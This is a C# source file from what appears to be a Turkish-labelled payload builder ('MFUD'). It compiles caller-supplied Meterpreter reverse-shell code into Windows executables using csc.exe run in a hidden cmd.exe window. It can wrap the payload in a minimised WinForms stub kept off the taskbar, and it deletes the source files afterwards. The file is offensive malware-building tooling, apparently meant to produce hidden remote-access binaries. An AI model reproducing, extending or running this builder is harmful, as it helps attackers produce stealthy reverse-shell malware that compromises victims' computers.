using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace SMET
{
    public class Compiler
    {
        public bool isCreated = false;
        private static List<string> _netFrameworkList = new List<string>();
        private static List<string> _x64NetFrameworkList = new List<string>();
        public void Console(string random, string fileName, string buildCode, string arch)
        {
            DeleteCsFileInDirectory();
            var csDirectory = Application.StartupPath + "\\" + @"_reverse_shell_des.cs";
            var exeDirectory = Application.StartupPath + "\\" + random + fileName;
            const string cscExeLocation = @"C:\Windows\System32\cmd.exe";
            var cscArguments = string.Empty;
            if (arch == "x86")
            {
                NetFrameWorkDirectory();
                var x86DotNet = _netFrameworkList[_netFrameworkList.Count - 1];
                cscArguments = @" /c C:\Windows\Microsoft.NET\Framework\" + x86DotNet +
                               "\\csc.exe /unsafe /platform:" + arch + " /out:\"" + exeDirectory + "\" \"" +
                               csDirectory + "\"";
            }
            else
            {
                X64NetFrameWorkDirectory();
                var x64DotNet = _x64NetFrameworkList[_x64NetFrameworkList.Count - 1];
                cscArguments = @" /c C:\Windows\Microsoft.NET\Framework\" + x64DotNet +
                               "\\csc.exe /unsafe /platform:" + arch + " /out:\"" + exeDirectory + "\" \"" +
                               csDirectory + "\"";
            }
            File.WriteAllText(csDirectory, buildCode);
            BuildRunMeterpreter(cscExeLocation, cscArguments);
            DeleteCsFileInDirectory();
            GetCreatedFile(exeDirectory);
        }
        public void Form(string random, string fileName, string buildCode, string arch)
        {
            const string strProgramCs =
                "using System; using System.Collections.Generic; using System.Linq; using System.Windows.Forms; namespace MeterpreterForm { static class Program { [STAThread] static void Main() { Application.EnableVisualStyles(); Application.SetCompatibleTextRenderingDefault(false); Application.Run(new Form1()); } } }";
            const string strFrmDesignerCs =
                "namespace MeterpreterForm { partial class Form1 { private System.ComponentModel.IContainer components = null; protected override void Dispose(bool disposing) { if (disposing && (components != null)) { components.Dispose(); } base.Dispose(disposing); } private void InitializeComponent() { this.SuspendLayout(); this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F); this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font; this.ClientSize = new System.Drawing.Size(465, 372); this.Name = \"Form1\"; this.ShowInTaskbar = false; this.Text = \"Form1\"; this.WindowState = System.Windows.Forms.FormWindowState.Minimized; this.Load += new System.EventHandler(this.Form1_Load); this.ResumeLayout(false); } } }";
            DeleteCsFileInDirectory();
            var csDirectory = Application.StartupPath + "\\" + @"Form1.cs";
            var csDesignerDirectory = Application.StartupPath + "\\" + @"Form1.Designer.cs";
            var csProgramDirectory = Application.StartupPath + "\\" + @"Program.cs";
            var exeDirectory = Application.StartupPath + "\\" + random + fileName;
            const string cscExeLocation = @"C:\Windows\System32\cmd.exe";
            var cscArguments = string.Empty;
            if (arch == "x86")
            {
                NetFrameWorkDirectory();
                var x86DotNet = _netFrameworkList[_netFrameworkList.Count - 1];
                cscArguments = @" /c C:\Windows\Microsoft.NET\Framework\" + x86DotNet +
                               "\\csc.exe /target:winexe /platform:" + arch + " /out:\"" + exeDirectory + "\" \"" +
                               Application.StartupPath + "\\*.cs" + "\"";
            }
            else
            {
                X64NetFrameWorkDirectory();
                var x64DotNet = _x64NetFrameworkList[_x64NetFrameworkList.Count - 1];
                cscArguments = @" /c C:\Windows\Microsoft.NET\Framework\" + x64DotNet +
                               "\\csc.exe /target:winexe /platform:" + arch + " /out:\"" + exeDirectory + "\" \"" +
                               Application.StartupPath + "\\*.cs" + "\"";
            }
            File.WriteAllText(csDirectory, buildCode);
            File.WriteAllText(csDesignerDirectory, strFrmDesignerCs);
            File.WriteAllText(csProgramDirectory, strProgramCs);
            BuildRunMeterpreter(cscExeLocation, cscArguments);
            DeleteCsFileInDirectory();
            GetCreatedFile(exeDirectory);
        }
        private static void BuildRunMeterpreter(string filename, string arguments)
        {
            var process = new Process();
            process.StartInfo.FileName = filename;
            if (!string.IsNullOrEmpty(arguments))
            {
                process.StartInfo.Arguments = arguments;
            }
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            var stdOutput = new StringBuilder();
            process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);
            string stdError = null;
            try
            {
                process.Start();
                process.BeginOutputReadLine();
                stdError = process.StandardError.ReadToEnd();
                process.WaitForExit();
            }
            catch (Exception e)
            {

            }

            if (process.ExitCode == 0)
            {

            }
            else
            {
                var message = new StringBuilder();

                if (!string.IsNullOrEmpty(stdError))
                {
                    message.AppendLine(stdError);
                }

                if (stdOutput.Length != 0)
                {
                    message.AppendLine("Std output:");
                    message.AppendLine(stdOutput.ToString());
                }
            }
        }
        private static void NetFrameWorkDirectory()
        {
            _netFrameworkList.Clear();
            string targetDirectory = @"C:\Windows\Microsoft.NET\Framework";
            string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);
            for (int i = 0; i < subdirectoryEntries.Length; i++)
            {
                string[] versionStrings = subdirectoryEntries[i].Split('\\');
                if (versionStrings[(versionStrings.Length - 1)].StartsWith("v"))
                {
                    if (versionStrings[(versionStrings.Length - 1)].StartsWith("VJ"))
                        return;
                    _netFrameworkList.Add(versionStrings[(versionStrings.Length - 1)]);
                }
            }
        }
        private static void X64NetFrameWorkDirectory()
        {
            _x64NetFrameworkList.Clear();
            string targetDirectory = @"C:\Windows\Microsoft.NET\Framework64";
            string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);
            for (int i = 0; i < subdirectoryEntries.Length; i++)
            {
                string[] versionStrings = subdirectoryEntries[i].Split('\\');
                if (versionStrings[(versionStrings.Length - 1)].StartsWith("v"))
                {
                    if (versionStrings[(versionStrings.Length - 1)].StartsWith("VJ"))
                        return;
                    _x64NetFrameworkList.Add(versionStrings[(versionStrings.Length - 1)]);
                }
            }
        }
        private static void DeleteCsFileInDirectory()
        {
            try
            {
                DirectoryInfo dir = new DirectoryInfo(Application.StartupPath);
                FileInfo[] Files = dir.GetFiles("*.cs");
                foreach (FileInfo file in Files)
                {
                    File.Delete(Application.StartupPath + "\\" + file.Name);
                }
            }
            catch (Exception exp)
            {
                MessageBox.Show(@"Hata Oluştu: " + exp.Message, @"MFUD Hata!", MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
            }
        }
        private void GetCreatedFile(string directoy)
        {
            try
            {
                if (File.Exists(directoy))
                {
                    isCreated = true;
                }
                else
                {
                    isCreated = false;
                }
            }
            catch (Exception exp)
            {
                MessageBox.Show(@"Hata Oluştu: " + exp.Message, @"MFUD Hata!", MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
            }
        }
    }
}
